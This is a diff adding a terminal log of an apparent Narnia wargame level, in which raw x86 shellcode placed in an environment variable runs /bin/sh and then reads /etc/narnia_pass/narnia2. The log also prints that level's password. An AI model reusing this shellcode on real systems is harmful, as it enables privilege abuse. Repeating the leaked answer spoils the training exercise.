@@ -1,0 +1,63 @@
+narnia1@narnia:/narnia$ ls -la
+total 116
+drwxr-xr-x  2 root    root    4096 Nov  9  2017 .
+drwxr-xr-x 25 root    root    4096 Mar 12  2018 ..
+-r-sr-x---  1 narnia1 narnia0 7568 Nov  9  2017 narnia0
+-r--r-----  1 narnia0 narnia0 1186 Nov  9  2017 narnia0.c
+-r-sr-x---  1 narnia2 narnia1 7404 Nov  9  2017 narnia1
+-r--r-----  1 narnia1 narnia1 1000 Nov  9  2017 narnia1.c
+-r-sr-x---  1 narnia3 narnia2 5164 Nov  9  2017 narnia2
+-r--r-----  1 narnia2 narnia2  999 Nov  9  2017 narnia2.c
+-r-sr-x---  1 narnia4 narnia3 5836 Nov  9  2017 narnia3
+-r--r-----  1 narnia3 narnia3 1841 Nov  9  2017 narnia3.c
+-r-sr-x---  1 narnia5 narnia4 5336 Nov  9  2017 narnia4
+-r--r-----  1 narnia4 narnia4 1064 Nov  9  2017 narnia4.c
+-r-sr-x---  1 narnia6 narnia5 5700 Nov  9  2017 narnia5
+-r--r-----  1 narnia5 narnia5 1261 Nov  9  2017 narnia5.c
+-r-sr-x---  1 narnia7 narnia6 6076 Nov  9  2017 narnia6
+-r--r-----  1 narnia6 narnia6 1602 Nov  9  2017 narnia6.c
+-r-sr-x---  1 narnia8 narnia7 6676 Nov  9  2017 narnia7
+-r--r-----  1 narnia7 narnia7 1974 Nov  9  2017 narnia7.c
+-r-sr-x---  1 narnia9 narnia8 5232 Nov  9  2017 narnia8
+-r--r-----  1 narnia8 narnia8 1292 Nov  9  2017 narnia8.c
+
+
+narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"')
+narnia1@narnia:/narnia$ ls
+narnia0    narnia1.c  narnia3    narnia4.c  narnia6    narnia7.c
+narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8
+narnia1    narnia2.c  narnia4    narnia5.c  narnia7    narnia8.c
+narnia1@narnia:/narnia$ whoami
+narnia1
+narnia1@narnia:/narnia$ cat /etc/narnia_pass//narnia2
+cat: /etc/narnia_pass//narnia2: Permission denied
+narnia1@narnia:/narnia$ ./narnia1
+Trying to execute EGG!
+$ cat /etc/narnia_pass/narnia2
+cat: /etc/narnia_pass/narnia2: Permission denied
+$ whoami 
+narnia1
+$ exit     
+-------------------------------------------------------------------------------------------------------------------
+
+narnia1@narnia:~$ ls
+narnia1@narnia:~$ cd /narnia/
+narnia1@narnia:/narnia$ ls
+narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8
+narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c
+narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"')
+narnia1@narnia:/narnia$ ./narnia1
+Trying to execute EGG!
+$ whoami
+narnia1
+$ cat /etc/narnia_pass/narnia2
+cat: /etc/narnia_pass/narnia2: Permission denied
+$ exit
+narnia1@narnia:/narnia$ export  EGG=`perl -e 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x6e\x69\x61\x32\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80"'`
+narnia1@narnia:/narnia$ ./narnia1
+Trying to execute EGG!
+nairiepecu
+-----------------------------------------------------------------------------------------------------------------------
+
+
+
